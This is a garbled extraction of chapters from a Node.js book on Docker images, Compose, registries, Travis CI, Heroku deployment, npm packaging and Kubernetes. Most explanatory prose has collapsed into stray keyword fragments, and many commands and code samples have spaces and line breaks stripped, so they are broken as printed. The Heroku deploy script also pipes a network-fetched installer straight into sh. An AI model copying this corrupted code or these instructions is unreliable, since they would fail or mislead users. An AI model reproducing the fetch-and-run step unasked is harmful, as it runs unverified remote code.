+    recipe-api     recipe-api     node_modules     chokidar     fsevents     node_modules     postinstall     preinstall     .gitignore     .npmignore     .dockerignore     
+    recipe-api/.dockerignore     
+example    5-1.recipe-api/.dockerignore
+node_modules npm-debug.log Dockerfile
+
+    .gitignore     node_modules     
+Dependency Stage
+    recipe-api/Dockerfile     
+example    5-2.recipe-api/Dockerfile�deps�stage
+FROM node:14.8.0-alpine3.12 AS deps
+
+WORKDIR/srv
+COPY package*.json./
+RUN npm ci--only=production
+#COPY package.json yarn.lock./#RUN yarn install--production
+
+    FROM    node:14.8.0-alpine3.12     FROM     
+    deps    WORKDIR/srv     /srv     cd     COPY     package*.json    package.json     package-lock.json    ./    /srv     yarn.lock     RUN     npm ci--only=production     npm ci     npm install     yarn install--production    npm     yarn     node     
+
+
+Release Stage
+    recipe-api/Dockerfile     
+example    5-3.recipe-api/Dockerfile�release�stage part one	
+    
+FROM alpine:3.12 AS release
+
+ENV V 14.8.0
+ENV FILE node-v$V-linux-x64-musl.tar.xz
+
+RUN apk add--no-cache libstdc++\
+&&apk add--no-cache--virtual.deps curl\&&curl-fsSLO--compressed\
+"https://unofficial-builds.nodejs.org/download/release/v$V/$FILE"\&&tar-xJf$FILE-C/usr/local--strip-components=1\
+&&rm-f$FILE/usr/local/bin/npm/usr/local/bin/npx\&&rm-rf/usr/local/lib/node_modules\
+&&apk del.deps
+    deps     release     alpine     npm     yarn     alpine     V     v14.8.0    FILE     RUN     RUN
+    apk    RUN     apk add    --no-cache     apk     
+    libstdc++    curl    -
+-virtual.deps     apk     curl     tar     /usr/local    rm     apk del.deps     curl     release     
+example    5-4.recipe-api/Dockerfile�release�stage part two
+WORKDIR/srv
+COPY--from=deps/srv/node_modules./node_modules COPY..
+
+EXPOSE 1337
+ENV HOST 0.0.0.0
+ENV PORT 1337
+CMD["node","producer-http-basic.js"]
+
+    /srv    COPY     --from     COPY     /srv/node_modules     deps     /srv/node_modules     release     COPY     .    /srv
+    .    WORKDIR     /srv    .dockerignore     node_modules     node_modules     deps     producer-*.js     COPY.        
+    EXPOSE     ENV     HOST     PORT     127.0.0.1     within the Docker container    CMD     node     producer-http-basic.js     
+    
+From Image to Container
+    recipe-api     
+example    5-5.Building an image from a Dockerfile
+$cd recipe-api
+$docker build-t tlhunter/recipe-api:v0.0.1.
+    docker build     -t     tag     repository/name:version    tlhunter    recipe-api    v0.0.1    SemVer     latest    
+Sending build context to Docker daemon 155.6kB Step 1/15:FROM node:14.8.0-alpine3.12 AS deps
+--->532fd65ecacd
+...TRUNCATED...
+
+Step 15/15:CMD["node","producer-http-basic.js"]
+--->Running in d7bde6cfc4dc
+Removing intermediate container d7bde6cfc4dc
+--->a99750d85d81
+Successfully built a99750d85d81
+Successfully tagged tlhunter/recipe-api:v0.0.1
+
+    
+$docker run--rm--name recipe-api-1\
+-p 8000:1337 tlhunter/recipe-api:v0.0.1
+
+    --rm     --name     recipe-api-1    -p     worker pid=1    http://0.0.0.0:1337    within the container    
+
+
+    
+    
+$curl http://localhost:8000/recipes/42
+
+    
+$docker kill recipe-api-1
+
+Rebuilding and Versioning an Image
+    recipe-api     docker build     
+532fd65ecacd,bec6e0fc4a96,58341ced6003,dd6cd3c5a283,e7d92cdc71fe,4f2ea97869f7,b5b203367e62,0dc0f7fddd33,4c9a03ee9903,a86f6f94fc75,cab24763e869,0efe3d9cd543,9104495370ba,04d6b8f0afce,b3babfadde8e
+
+    recipe-api/producer-http-basic.js         
+example    5-6.recipe-api/producer-http-basic.js,truncated
+server.get('/recipes/:id',async(req,reply)=>{
+
+return"Hello,world!";
+});
+
+    build     v0.0.2    
+532fd65ecacd,bec6e0fc4a96,58341ced6003,dd6cd3c5a283,e7d92cdc71fe,4f2ea97869f7,b5b203367e62,0dc0f7fddd33,4c9a03ee9903,a86f6f94fc75,7f6f49f5bc16,4fc6b68804c9,df073bd1c682,f67d0897cb11,9b6514336e72
+
+    COPY..    producer-http-basic.js     
+$npm install--save-exactleft-pad@1.3.0
+
+    package.json     package-lock.json     COPY     deps     v0.0.3    
+532fd65ecacd,bec6e0fc4a96,959c7f2c693b,6e9065bacad0,e7d92cdc71fe,4f2ea97869f7,b5b203367e62,0dc0f7fddd33,4c9a03ee9903,b97b002f4734,f2c9ac237a1c,f4b64a1c5e64,fee5ff92855c,638a7ff0c240,12d0c7e37935
+
+    release     COPY--from=deps     deps     deps     release     
+    v0.0.1     
+$docker history tlhunter/recipe-api:v0.0.1
+
+    ENV    CMD    EXPOSE    WORKDIR     FROM
+...release     RUN
+apk add     COPY..    140kB     COPY--from=deps     node_modules     Layer     Size     left-pad     v0.0.1     v0.0.2     v0.0.2     v0.0.1    
+Table 5-1.Docker image layers comparison
+
+Layer	Size	v0.0.1	v0.0.2	v0.0.3
+1:FROM node AS deps	N/A	
+532fd65ecacd	
+532fd65ecacd	
+532fd65ecacd
+2:WORKDIR/srv	N/A	
+bec6e0fc4a96	
+bec6e0fc4a96	
+bec6e0fc4a96
+3:COPY package*	N/A	
+58341ced6003	
+58341ced6003	
+959c7f2c693b
+4:RUN npm ci	N/A	
+dd6cd3c5a283	
+dd6cd3c5a283	
+6e9065bacad0
+5:FROM alpine AS release	5.6MB	
+e7d92cdc71fe	
+e7d92cdc71fe	
+e7d92cdc71fe
+6:ENV V	0	
+4f2ea97869f7	
+4f2ea97869f7	
+4f2ea97869f7
+7:ENV FILE	0	
+b5b203367e62	
+b5b203367e62	
+b5b203367e62
+8:RUN apk...	79.4MB	
+0dc0f7fddd33	
+0dc0f7fddd33	
+0dc0f7fddd33
+9:WORKDIR/srv	0	
+4c9a03ee9903	
+4c9a03ee9903	
+4c9a03ee9903
+10:COPY node_modules	67.8MB	
+a86f6f94fc75	
+a86f6f94fc75	
+b97b002f4734
+11:COPY..	138kB	
+cab24763e869	
+7f6f49f5bc16	
+f2c9ac237a1c
+12:EXPOSE	0	
+0efe3d9cd543	
+4fc6b68804c9	
+f4b64a1c5e64
+13:ENV HOST	0	
+9104495370ba	
+df073bd1c682	
+fee5ff92855c
+14:ENV PORT	0	
+04d6b8f0afce	
+f67d0897cb11	
+638a7ff0c240
+15:CMD	0	
+b3babfadde8e	
+9b6514336e72	
+12d0c7e37935
+Cost per Deploy		N/A	138kB	68MB
+
+    v0.0.3     v0.0.2    v0.0.1    package.json     node_modules    apk     
+    node_modules    latest    latest    v0.1.0     latest    v0.0.4     latest    latest     v0.1.0    v0.0.4    latest     
+Basic Orchestration with Docker Compose
+    web-api     recipe-api     docker run     sebp/elk     
+    cer,and Zipkin dependency graph
+
+    recipe-api/.dockerignore         web-api/.dockerignore    recipe-api/Dockerfile-zipkin     
+example    5-7.recipe-api/Dockerfile-zipkin
+FROM node:14.8.0-alpine3.12 WORKDIR/srv
+COPY package*.json./
+RUN npm ci--only=production COPY..
+CMD["node","producer-http-zipkin.js"]#change for web-api
+    web-api/Dockerfile-zipkin     CMD     consumer-http-zipkin.js     docker build     Dockerfile    
+Dockerfile     recipe-api     producer-http-basic.js     Dockerfile-*    docker     docker-compose.yml     distributed-node/    
+example    5-8.docker-compose.yml,part one
+version:"3.7"services:
+zipkin:
+image:openzipkin/zipkin-slim:2.19ports:
+-"127.0.0.1:9411:9411"
+        
+    version     services     zipkin     zipkin     image     zipkin     openzipkin/zipkin-slim     docker run    ports     
+    -p     docker run     docker-compose.yml     
+
+example    5-9.docker-compose.yml,part two
+##note the two space indent recipe-api:
+build:
+context:./recipe-api dockerfile:Dockerfile-zipkin
+ports:
+-"127.0.0.1:4000:4000"
+environment:HOST:0.0.0.0
+  ZIPKIN:zipkin:9411 depends_on:
+-zipkin
+            zipkin     
+    recipe-api     zipkin     image     build     image     build     build     context    recipe-api     dockerfile     Dockerfile    Dockerfile-zipkin     environment     HOST     ZIPKIN
+
+    zipkin     localhost     depends_on     docker-compose.yml
+    web-api     
+example    5-10.docker-compose.yml,part three
+##note the two space indent web-api:
+build:
+context:./web-api dockerfile:Dockerfile-zipkin
+ports:
+-"127.0.0.1:3000:3000"
+environment:
+TARGET:recipe-api:4000 ZIPKIN:zipkin:9411 HOST:0.0.0.0
+depends_on:
+-zipkin
+-recipe-api
+    
+$docker-compose up
+
+    curl     
+$curl http://localhost:3000/
+$curl http://localhost:4000/recipes/42
+$curl http://localhost:9411/zipkin/
+
+    curl     web-api     recipe-api     
+
+
+    
+$docker rm distributed-node_web-api_1\
+distributed-node_recipe-api_1 distributed-node_zipkin_1
+
+
+Internal Docker Registry
+    Docker registry     
+    
+
+
+    
+Running the Docker Registry
+    
+    
+$docker run-d\
+--name distnode-registry\
+-p 5000:5000\
+--restart=always\
+-v/tmp/registry:/var/lib/registry\registry:2.7.1
+
+    almost     /mnt/    -d     recipe-api     docker image tag    
+#run for each of v0.0.1,v0.0.2,v0.0.3
+$docker image tag tlhunter/recipe-api:v0.0.1\localhost:5000/tlhunter/recipe-api:v0.0.1
+
+Pushing and Pulling to the Registry
+    v0.0.2     v0.0.1     v0.0.3     v0.0.2     docker push    git push     npm publish    
+#run for each of v0.0.1,v0.0.2,v0.0.3
+$time docker push localhost:5000/tlhunter/recipe-api:v0.0.1
+
+    time     
+Table 5-2.Docker image deployment times
+
+Version Time
+
+
+    node_modules    node_modules    node_modules     
+$docker rmi localhost:5000/tlhunter/recipe-api:v0.0.2
+$docker rmi tlhunter/recipe-api:v0.0.2
+$docker run tlhunter/recipe-api:v0.0.2#should fail
+
+    docker rmi     docker run     Unable to find image
+tlhunter/recipe-api:v0.0.2 locally    tlhunter     recipe-api:v0.0.2     
+$docker pull localhost:5000/tlhunter/recipe-api:v0.0.2
+$docker image tag localhost:5000/tlhunter/recipe-api:v0.0.2\
+
+tlhunter/recipe-api:v0.0.2
+$docker run tlhunter/recipe-api:v0.0.2#this time it succeeds
+
+    docker pull     localhost:5000     docker image tag     docker run     docker run     
+Running a Docker Registry UI
+    
+$docker run\
+--name registry-browser\
+--link distnode-registry\
+-it--rm\
+-p 8080:8080\
+-e DOCKER_REGISTRY_URL=http://distnode-registry:5000\klausmeyer/docker-registry-browser:1.3.2
+
+    --link     -e DOCKER_REGISTRY_URL     http://localhost:8080     
+    tlhunter    recipe-api    v0.0.3    v0.0.2    v0.0.1     docker
+history    
+Figure 5-4.Docker Registry browser screenshot
+
+    
+$docker stop distnode-registry
+$docker rm distnode-registry
+
+
+
+
+1Alpine uses musl instead of glibc as its C standard library,which can cause compatibility issues.
+2	This section of the file starts off with some comment symbols.This is to avoid ambiguity with leading whitespace,which can cause YAML errors.
+
+Chapter 6.Deployments
+
+
+    deployment    
+    should         nodemon     forever     
+    build pipeline    Continuous Integration    
+    Build
+    Release
+    Artifact
+    nyc     
+    rollback    
+Build Pipeline with Travis CI
+    distnode-deploy    Distributed Node.js Sample Project    README.md     .gitignore     MIT License    Create repository     
+Creating a Basic Project
+    distributed-node/    <USERNAME>
+    
+$git clonegit@github.com:<USERNAME>/distnode-deploy.git
+$cd distnode-deploy
+
+    
+    
+$npm init-y
+$npm installfastify@3.2
+
+    distnode-deploy/server.js     
+example    6-1.distnode-deploy/server.js
+#!/usr/bin/env node
+
+//npm installfastify@3.2
+const server=require('fastify')();
+const HOST=process.env.HOST||'127.0.0.1';const PORT=process.env.PORT||8000;
+const Recipe=require('./recipe.js');
+
+server.get('/',async(req,reply)=>{return"Hello from Distributed Node.js!";
+});
+server.get('/recipes/:id',async(req,reply)=>{const recipe=new Recipe(req.params.id);
+await recipe.hydrate();return recipe;
+});
+
+server.listen(PORT,HOST,(err,host)=>{console.log(`Server running at${host}`);
+});
+    distnode-deploy/recipe.js    
+example    6-2.distnode-deploy/recipe.js
+module.exports=class Recipe{constructor(id){
+this.id=Number(id);this.name=null;
+}
+async hydrate(){//Pretend DB Lookup this.name=`Recipe:#${this.id}`;
+}
+
+toJSON(){
+return{id:this.id,name:this.name};
+}
+};
+    distnode-deploy/package.json     npm test     test     scripts     
+"scripts":{
+"test":"echo\"Fake Tests\"&&exit 0"
+},
+
+    distnode-deploy/.travis.yml     
+example    6-3.distnode-deploy/.travis.yml
+language:node_js node_js:
+-"14"
+install:
+  -npm install script:
+-PORT=0 npm test
+        master     
+$git add.
+$git commit-m"Application files"
+$git push
+
+    
+    
+Configuring Travis CI
+        distnode-deploy     distnode-deploy     distnode-deploy     
+Testing a Pull Request
+    npm test    package.json     
+    
+"scripts":{
+"test":"echo\"Fake Tests\"&&exit 1"
+},
+
+    
+$git checkout-b feature-1
+$git add.
+$git commit-m"Causing a failure"
+$git push--set-upstream origin feature-1
+
+    distnode-deploy     feature-1     master    
+
+Figure 6-1.GitHub pull request failure
+
+    
+    npm install     npm test     
+$npm test
+>distnode-deploy@1.0.0test/home/travis/build/tlhunter/distnode-deploy
+>echo"Fake Tests"&&exit 1 Fake Tests
+npm ERR!Test failed.See above for more details.The command"npm test"exited with 1.
+
+    
+
+Automated Testing
+    Tape    distnode-deploy     test/    
+$mkdir test
+$npm install--save-dev tape@5
+
+    --save-dev     tape     test/    
+    test/    package.json     
+"scripts":{
+"test":"tape./test/**/*.js"
+},
+
+    npm test     tape     tape     node_modules/.bin/    npm test     tape
+    tape     ./test/**/*.js     .js     test/    tape     
+Unit Tests
+Unit testing     units     
+    test/    test/    src/models/account.js     test/models/account.js     unit.js     test/    
+example    6-4.distnode-deploy/test/unit.js
+#!/usr/bin/env node
+
+//npm install-D tape@5 const test=require('tape');
+const Recipe=require('../recipe.js');
+
+test('Recipe#hydrate()',async(t)=>{const r=new Recipe(42);
+await r.hydrate();
+t.equal(r.name,'Recipe:#42','name equality');
+});
+
+test('Recipe#serialize()',(t)=>{const r=new Recipe(17);
+t.deepLooseEqual(r,{id:17,name:null},'serializes properly');t.end();
+});
+        
+    Recipe#hydrate()    Recipe#serialize()    t.end()    
+    t     t.equal()    t.deepLooseEqual()    ==    t.deepEqual()    t.ok()    t.notOk()    t.throws()    t.doesNotThrow()    
+$npm test;echo"STATUS:$?"
+
+    
+TAP version 13
+#Recipe#hydrate()ok 1 name equality
+#Recipe#serialize()
+ok 2 serializes properly
+
+1..2
+#tests 2
+#pass 2
+
+#ok STATUS:0
+
+    tape     tape     
+
+Integration Tests
+Integration testing     request     reply     sinon     Stubs     Spies    
+    node-fetch     
+$npm install--save-devnode-fetch@2.6
+
+    test/    integration.js    user-account.js     gallery-upload.js    
+example    6-5.distnode-deploy/test/integration.js(first version)
+#!/usr/bin/env node
+
+//npm install--save-dev tape@5node-fetch@2.6const{spawn}=require('child_process');const test=require('tape');
+const fetch=require('node-fetch');
+
+const serverStart=()=>new Promise((resolve,_reject)=>{const server=spawn('node',['../server.js'],
+{env:Object.assign({},process.env,{PORT:0}),cwd:dirname});
+server.stdout.once('data',async(data)=>{const message=data.toString().trim();
+const url=/Server running at(.+)$/.exec(message)[1];resolve({server,url});
+});
+});
+
+test('GET/recipes/42',async(t)=>{
+const{server,url}=await serverStart();const result=await fetch(`${url}/recipes/42`);const body=await result.json();t.equal(body.id,42);
+server.kill();
+});
+    server.js            server.js     
+    serverStart()    server.js    stdout    server.js     integration.js     server.js     
+$npm test;echo"STATUS:$?"
+
+    tape     
+TAP version 13
+#GET/recipes/42
+ok 1 should be equal#Recipe#hydrate()ok 2 name equality
+#Recipe#serialize()
+ok 3 serializes properly
+
+    
+//Application code:foo-router.js
+//GEThttp://host/resource?foo[bar]=1 module.exports.fooHandler=async(req,_reply)=>{
+const foobar=req.query.foo.bar;return foobar+1;
+}
+//Test code:test.js
+const router=require('foo-router.js');test('#fooHandler()',async(t)=>{
+const foobar=await router.fooHandler({foo:{bar:1}
+});
+t.strictEqual(foobar,2);
+});
+
+    bar:1     bar:"1"    foo.bar     a[]=1&a[]=2     
+    {"a":[1,2]}    {"a":2}    
+Code Coverage Enforcement
+Code coverage     
+
+
+    nyc    
+    
+$npm install--save-dev nyc@15
+
+    nyc    package.json     
+"scripts":{
+"test":"nyc tape./test/*.js"
+},
+
+    nyc     .nycrc     
+example    6-6.distnode-deploy/.nycrc
+{
+"reporter":["lcov","text-summary"],"all":true,
+"check-coverage":true,"branches":100,
+"lines":100,
+"functions":100,
+"statements":100
+}
+
+    reporter    lcov    text-summary    stdout    all    
+    check-coverage     branches    lines    functions    statements    
+$npm test;echo"STATUS:$?"
+
+    
+ERROR:Coverage for lines(94.12%)...ERROR:Coverage for functions(83.33%)...ERROR:Coverage for branches(75%)...
+ERROR:Coverage for statements(94.12%)...
+===========Coverage summary===========Statements	:94.12%(16/17)
+Branches	:75%(3/4)Functions	:83.33%(5/6)Lines	:94.12%(16/17)
+========================================STATUS:1
+
+    GET/    lcov     .nycrc     coverage/    .gitignore     coverage/lcov-report/index.html     recipe.js     server.js     server.js     
+Figure 6-2.nyc listing for recipe.js and server.js
+
+Figure 6-3.nyc code coverage for server.js
+
+    
+    GET/    return     async     integration.js     
+example    6-7.distnode-deploy/test/integration.js(second test)
+test('GET/',async(t)=>{
+const{server,url}=await serverStart();const result=await fetch(`${url}/`);
+const body=await result.text();
+t.equal(body,'Hello from Distributed Node.js!');server.kill();
+});
+    or     PORT=0    "0"    server.js     PORT     /*istanbul ignore next*/
+
+    istanbul    nyc    nyc    
+    istanbul    .nycrc     
+$npm test;echo"STATUS:$?"
+
+    
+$git add.
+$git commit-m"Adding a test suite and code coverage"
+$git push
+
+    
+master     
+$git checkout master
+$git pull
+
+    eslint     standard    
+
+
+Deploying to Heroku
+    
+    Heroku    master     master    master    master     
+
+Figure 6-4.GitHub,Travis CI,and Heroku
+
+    master         
+Create a Heroku App
+    
+Table 6-1.Create a new Docker app
+
+App name<USERNAME>-distnode
+
+    distnode    
+https://<USERNAME>-distnode.herokuapp.com/
+
+    
+Configure Travis CI
+    distnode-deploy/    master     
+$git checkout master
+
+    
+    travis     brew     travis     
+###macOS
+$brew install travis
+
+###Debian/Ubuntu Linux
+$ruby--version#`sudo apt install ruby`if you don't have Ruby
+$sudo apt-get install ruby2.7-dev#depending on Ruby version
+$sudo gem install travis
+
+    
+$travis login--pro--auto-token
+$travis encrypt--pro HEROKU_API_KEY=<YOUR_HEROKU_API_KEY>
+
+    --pro     travis-ci.com
+    travis encrypt     HEROKU_API_KEY    .travis.yml     
+    
+example    6-8.distnode-deploy/.travis.yml(amended)
+deploy:
+provider:script
+script:bash deploy-heroku.shon:
+   branch:masterenv:
+global:
+        master     deploy-heroku.sh    
+    deploy     provider     script     deploy-heroku.sh     master     env     travis encrypt     .travis.yml    secure:    env     
+env:
+global:
+-secure:"LONG STRING HERE"
+
+    HOST     0.0.0.0    
+example    6-9.distnode-deploy/Dockerfile
+FROM node:14.8.0-alpine3.12
+
+WORKDIR/srv
+COPY package*.json./
+RUN npm ci--only=production COPY..
+ENV HOST=0.0.0.0
+CMD["node","server.js"]
+    .travis.yml     
+Deploy Your Application
+    deploy-heroku.sh     .travis.yml     --app<USERNAME>-distnode     
+example    6-10.distnode-deploy/deploy-heroku.sh
+#!/bin/bash
+wget-qO-https://toolbelt.heroku.com/install-ubuntu.sh|sh heroku plugins:install@heroku-cli/plugin-container-registry heroku container:login
+heroku container:push web--app<USERNAME>-distnode heroku container:release web--app<USERNAME>-distnode
+
+    heroku    wget     heroku     heroku container:login     heroku     HEROKU_API_KEY     heroku container:push     
+    heroku container:release     
+$git add.
+$git commit-m"Enabling Heroku deployment"
+$git push
+
+    master     feature-1     master     
+
+
+Figure 6-5.Travis branch list
+
+    master     HEROKU_API_KEY=[secure]    
+Figure 6-6.Travis branch list
+
+    
+    heroku     
+Releasing images web to<USERNAME>-distnode...done
+
+    
+https://<USERNAME>-distnode.herokuapp.com/
+
+    
+
+
+Modules,Packages,and SemVer
+    
+    
+Node.js Modules
+            exports    require        
+    var foo=bar    
+(function(exports,require,module,filename,dirname){
+//File contents go here
+});
+
+    exports     require    filename     dirname     require     module     exports     module.exports     filename     module.filename    dirname     path.dirname(    filename)    require.main===module    server.js     globalThis     global    globalThis     window    global     globalThis     
+    require()    require(mod)        mod     fs        mod     /    ./    ../        package.json     main
+        package.json    index.js        .js    .json    .node        ./node_modules     mod         node_modules     require()    require()    /srv/server.js    
+Table 6-2.Module resolution within/srv/server.js
+
+require('url')	Core url module
+
+    require('foo.js')    foo.js/    node_modules     contacts.js     contacts.json     require('./contacts')    contact.js     contacts.js     contacts.json     require cache    require.cache     module     exports    require()    
+SemVer(Semantic Versioning)
+SemVer     
+    
+    dependencies     package.json     npm install     yarn    
+"dependencies":{"fastify":"^2.11.0",
+"ioredis":"~4.14.1",
+"pg":"7.17.1"
+}
+
+    fastify    ^    npm install
+    ioredis    pg    
+    
+module.exports=class Widget{getName(){
+return this.name;
+}
+setName(name){this.name=name;
+}
+nameLength(){
+return this.name.length;
+}
+}
+
+    setName()    nameLength()    setName()    
+setName(name){
+this.name=String(name);
+}
+
+    hasName()    
+hasName(){
+return!!this.name;
+}
+
+    nameLength()    nameLength()    
+    setName()    hasName()    EventEmitter    ready    empty    full    empty     before     ready     empty after     ready     
+    
+npm Packages and the npm CLI
+        npm     node_modules/    
+    dependencies     package.json     node_modules/    
+    crypto.randomBytes()    Controlling package content
+    package.json     
+$mkdir leftish-padder&&cd leftish-padder
+$npm init
+#set version to:0.1.0
+$touch index.js README.md foo.js bar.js baz.js
+$mkdir test&&touch test/index.js
+$npm install--saveexpress@4.17.1
+$dd if=/dev/urandom bs=1048576 count=1 of=screenshot.bin
+$dd if=/dev/urandom bs=1048576 count=1 of=temp.bin
+
+    screenshot.bin     README.md     
+temp.bin     ls-la     
+Table 6-3.File listing output
+
+Size Filename	Size Filename	Size Filename
+
+
+    package.json     README.md     node_modules/    package-lock.json     node_modules/    npm publish--dry-run         
+Table 6-4.npm package file listing
+
+Size	Filename	Size	Filename	Size Filename
+
+
+1.0MB screenshot.bin 1.0MB temp.bin	0	bar.js
+
+
+    temp.bin     .gitignore     .gitignore     
+example    6-1.leftish-padder/.gitignore
+node_modules temp.bin
+package-lock.json
+    node_modules/    temp.bin     package-lock.json     npm publish--dry-run     temp.bin     .npmignore    node_modules/    .gitignore     .npmignore     .gitignore    .gitignore     
+    .npmignore
+    
+example    6-12.leftish-padder/.npmignore
+temp.bin screenshot.bin test
+
+    npm publish--dry-run     
+Table 6-5.npm package file listing with
+.gitignore and.npmignore files
+
+Size Filename Size Filename	Size Filename
+
+
+    
+
+
+    
+    left-pad     package.json     Dependency hierarchy and deduplication
+    require()    node_modules/    require()    npm install     node_modules/    package.json         ode_modules/
+foo/(1.0.0)
+
+    node_modules/    node_modules/    require()    node_modules/
+    
+node_modules/foo/(1.0.0)
+bar/(2.0.0)
+
+    bar     foo     node_modules/    node_modules/        ode_modules/foo/(1.0.0)
+bar/(2.0.0)node_modules/
+foo/(2.0.0)
+
+    npm install     
+    package.json     package-lock.json     npm-shrinkwrap.json    npm install     npm install<package>    package.json     package-lock.json    leftish-padder         express     
+
+accepts	array-flatten	body-parser	bytes
+content-disposition	content-type	cookie	cookie-signature
+debug	depd	destroy	ee-first
+
+    npm ls    
+leftish-padder@0.1.0
++--express@4.17.1
++--accepts@1.3.7
+�+-...TRUNCATED...
++--body-parser@1.19.0
+�+--bytes@3.1.0
+�+--content-type@1.0.4deduped
+
++...TRUNCATED...
++--content-type@1.0.4
+
+    y-parser    body-parser     content-type    content-type     express    require()    leftish-padder     require('content-type')    
+
+
+
+Internal npm Registry
+        
+        npmjs.com                 
+    
+Running Verdaccio
+    
+$docker run-it--rm\
+--name verdaccio\
+-p 4873:4873\
+verdaccio/verdaccio:4.8
+
+    
+    
+http://localhost:4873/
+
+    
+Configuring npm to Use Verdaccio
+    LOGIN    
+$npm set registry http://localhost:4873
+$npm adduser--registry http://localhost:4873
+
+    --registry     leftish-padder     
+Publishing to Verdaccio
+    npm publish     
+$cd leftish-padder
+$npm publish--registry http://localhost:4873
+
+    publish     --dry-run         
++leftish-padder@0.1.0
+
+    leftish-padder     leftish-padder     README.md     express@^4.17.1    latest     0.1.0    index.js     index.js     leftish-padder     
+example    6-13.leftish-padder/index.js
+module.exports=(s,p,c='')=>String(s).padStart(p,c);
+    
+$npm verson patch
+$npm publish--registry http://localhost:4873
+
+    leftish-padder     widget-co-internal-*    scope    package.json     name     tlhunter    
+"name":"@tlhunter/leftish-padder",
+
+    publish     
+    <SCOPE>    
+$mkdir sample-app&&cd sample-app
+$npm init-y
+$npm install@<SCOPE>/leftish-padder
+$echo"console.log(require('@<SCOPE>/leftish-padder')(10,4,0));"\
+>app.js
+$node app.js
+
+    0010     
+$npm config delete registry
++++++++
+    npmjs.com     
+
+
+1	Python,and most other languages,can be executed by a separate web server on a request/response basis(perhaps with Django),or persistently run itself in memory(�la Twisted).
+2	In theory,you could run nodemon on a production server and then just overwrite files with newer versions.But you should never do such a thing.
+3�Flaky�is a super-scientific engineering term meaning�something sometimes breaks.�
+4	Tools like Browserify,Webpack,and Rollup make it possible to use CommonJS patterns in the browser.
+5When I worked for Intrinsic,we distributed our security product to customers in this manner.
+6You can also use npm pack to generate a tarball that you can manually inspect.
+7This may sound far-fetched,but it did happen to an employer of mine.
+8	If you get a EPUBLISHCONFLICT error,then some poor reader has published their package to npm and you�ll need to change the package name.
+
+Chapter 7.Container Orchestration
+
+
+    docker     container orchestration                                 
+    
+Introduction to Kubernetes
+Kubernetes     
+Kubernetes Overview
+    
+Figure 7-1.Overview of a Kubernetes cluster
+
+    Container
+    Volume
+    Pod
+    Node
+    Kubelet    Kube Proxy    Master
+    kubectl     Cluster
+    
+Kubernetes Concepts
+    recipe-api     0.0.3     Scheduling
+    kube-scheduler    scheduled     Namespaces
+    
+    default    kube-system    kube-public     kubernetes-dashboard     staging     production    default     Labels
+    platform:node     platform-version:v14    machine:physical     kernel:3.16    app     web-api     recipe-api    Selectors
+    machine:physical    Stateful sets
+    Replica sets
+    Deployments
+    
+    Controllers
+    Service
+    Ingress
+    Probe
+    
+    
+    Minikube    
+Starting Kubernetes
+    
+$minikube version
+$kubectl version--client
+
+    
+
+
+Getting Started
+    
+#Linux:
+
+$minikube start#MacOS:
+$minikube start--vm=true
+
+        docker ps     
+Table 7-1.Minikube running inside Docker
+
+
+Container ID
+
+245e83886d65
+
+
+
+
+    
+$kubectl get pods
+
+    default     default     
+$kubectl get pods--namespace=kube-system
+
+    
+
+NAME	READY	STATUS	RESTARTS	AGE
+coredns-66bff467f8-8j5mb	1/1	Running	6	95s
+etcd-minikube	1/1	Running	4	103s
+kube-scheduler-minikube	1/1	Running	5	103s
+
+    
+    
+$kubectl get nodes
+
+    
+
+NAME	STATUS	ROLES	AGE	VERSION
+minikube	Ready	master	3m11s	v1.18.0
+
+    minikube     docker ps    docker     docker     minikube-p minikube docker-env    
+export DOCKER_TLS_VERIFY="1"
+export DOCKER_HOST="tcp://172.17.0.3:2376"
+export DOCKER_CERT_PATH="/home/tlhunter/.minikube/certs"export MINIKUBE_ACTIVE_DOCKERD="minikube"
+
+    
+$eval$(minikube-p minikube docker-env)
+
+    docker     docker     docker ps     docker images    k8s     
+$minikube dashboard
+
+    kubernetes-dashboard     
+
+Figure 7-2.Kubernetes dashboard overview
+
+    Cluster
+    minikube     kubectl get nodes     Namespace
+    default    kube-system     Overview
+    kube-system     
+    default     Workloads
+    Discovery and load balancing
+    Config and storage
+    
+    default    default     
+    
+
+
+
+Deploying an Application
+    kubectl     kubectl get pods     get    pods    apply
+    
+Kubectl Subcommands
+    kubectl     docker run     
+    
+$kubectl create deployment hello-minikube\
+--image=k8s.gcr.io/echoserver:1.10
+$kubectl get deployments
+$kubectl get pods
+$kubectl get rs
+
+    echoserver     
+
+$	kubectl get deployments	
+	NAME	READY	UP-TO-DATE	AVAILABLE	AGE	
+	hello-minikube	0/1	1	0	3s	
+$	kubectl get pods				
+	NAME	READY	STATUS		RESTARTS AGE
+hello-minikube-6f5579b8bf-rxhfl 0/1	ContainerCreating 0	4s
+$kubectl get rs
+NAME	DESIRED	CURRENT	READY	AGE
+hello-minikube-64b64df8c9	1	1	0	0s
+
+    hello-minikube-6f5579b8bf-rxhfl     
+    kubectl get     -L app     app     
+
+$	kubectl get deployments
+NAME	READY	UP-TO-DATE	
+AVAILABLE	
+AGE
+	hello-minikube	1/1	1	1	7m19s
+$	kubectl get pods	-L	app				
+	NAME		READY	STATUS	RESTARTS	AGE	APP
+hello-minikube-123 1/1	Running 0	7m24s hello-minikube
+$	kubectl get rs	
+	NAME	DESIRED	CURRENT	READY	AGE
+	hello-minikube-64b64df8c9	1	1	1	7m25s
+
+    hello-minikube     
+$kubectl expose deployment hello-minikube\
+--type=NodePort--port=8080
+$kubectl get services-o wide
+
+    
+NAME	TYPE	...PORT(S)	AGE SELECTOR
+hello-minikube NodePort...8080:31710/TCP 6s	app=hello-minikube kubernetes	ClusterIP...443/TCP	7d3h<none>
+
+    kubernetes     hello-minikube     hello-minikube     NodePort    
+    app     hello-minikube    app     hello-minikube     minikube     hello-minikube     
+$minikube service hello-minikube--url
+$curl`minikube service hello-minikube--url`
+
+    http://172.17.0.3:31710    hello-minikube     hello-minikube     
+$kubectl delete services hello-minikube
+$kubectl delete deployment hello-minikube
+
+    
+    
+$kubectl get deployments
+$kubectl get pods
+$kubectl get rs
+
+    
+Kubectl Configuration Files
+    docker-compose     kubectl
+apply-f<FILENAME>    recipe-api         replicas         
+    recipe-api     
+$cd recipe-api
+$eval$(minikube-p minikube docker-env)#ensure Minikube docker
+$docker build-t recipe-api:v1.
+
+    recipe-api:v1     recipe-api/recipe-api-deployment.yml    
+example    7-1.recipe-api/recipe-api-deployment.yml,part one
+apiVersion:apps/v1 kind:Deploymentmetadata:
+name:recipe-apilabels:
+app:recipe-api
+        recipe-api        app=recipe-api    
+    recipe-api     
+example    7-2.recipe-api/recipe-api-deployment.yml,part two
+spec:
+replicas:5selector:
+matchLabels:
+   app:recipe-api template:
+
